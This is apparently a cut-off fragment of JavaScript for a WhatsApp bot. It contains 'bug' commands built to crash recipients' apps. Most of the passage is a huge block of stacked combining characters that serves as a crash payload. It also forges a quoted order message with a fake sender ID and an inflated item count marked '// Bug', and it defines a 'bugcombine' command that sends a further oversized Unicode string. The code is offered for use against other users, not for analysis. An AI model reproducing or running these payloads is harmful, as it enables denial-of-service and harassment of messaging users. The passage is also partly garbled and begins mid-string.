̻̬̥�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̛̯̠͔̟̿̿̀̊̒́̀̌̂̔̍̓͡',
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'ʀᴀɴᴢ',
    orderTitle: 'fake', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
        case 'bugcombine':
if (!kurz.key.fromMe && !isOwner) return
                 kurzxd.toggleDisappearingMessages(from, 'wokwok')
kurzxd.sendMessage(from, `ஓঔ🛡⇝͜͡✪𝕷𝖔𝖗𝖉\x20𝕬𝖗𝖎𝖋𝖎🦅\x20͜͡✪*\x0a*~*.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.*999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭999999**ผิดุท้่เึางืผิดุท้่เึางื**9999999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅